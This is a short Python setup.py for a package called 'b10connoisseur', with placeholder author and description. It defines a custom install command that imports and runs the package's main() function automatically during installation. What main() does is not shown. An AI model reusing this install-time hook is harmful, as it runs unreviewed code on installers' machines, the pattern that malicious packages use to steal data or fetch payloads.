from setuptools import setup, find_packages
from setuptools.command.install import install

# Import your function
from b10connoisseur import main

class CustomInstall(install):
    def run(self):
        main()  # Call the function
        install.run(self)  # Proceed with the regular install process

setup(
    name='b10connoisseur',
    version='0.5.0',
    packages=find_packages(),
    description='A brief description of my package',
    long_description=open('README.md').read(),
    long_description_content_type='text/markdown',
    author='Your Name',
    classifiers=[
        'Programming Language :: Python :: 3',
        'License :: OSI Approved :: MIT License',
        'Operating System :: OS Independent',
    ],
    python_requires='>=3.6',
    cmdclass={
        'install': CustomInstall,
    },
)

